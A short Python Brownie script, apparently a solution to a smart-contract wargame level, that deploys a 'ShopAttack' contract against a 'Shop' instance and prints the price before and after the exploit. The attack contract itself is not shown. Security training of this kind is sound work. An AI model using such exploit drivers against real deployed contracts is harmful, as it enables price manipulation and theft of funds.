from brownie import accounts, Contract, Shop, ShopAttack


INSTANCE_ADDRESS = "0xd0b7194E183CB0cE46390c18bc7835e4C66821ef"
ACCOUNT = "straul"


def get_account():
    # account = accounts[0]
    account = accounts.load(ACCOUNT)
    return account


def hack_shop(account):
    # deploy contracts
    # shop = Shop.deploy({'from': account})
    shop = Contract.from_abi(name="Shop", address=INSTANCE_ADDRESS, abi=Shop.abi)
    buyer = ShopAttack.deploy({'from': account})

    print(f"Shop price before hack: {shop.price()}")
    print(f"Balance of Buyer: {buyer.balance()}")
    buyer.attack(shop.address, {'from': account})
    print(f"Shop price after hack: {shop.price()}")



def main():
    account = get_account()
    hack_shop(account)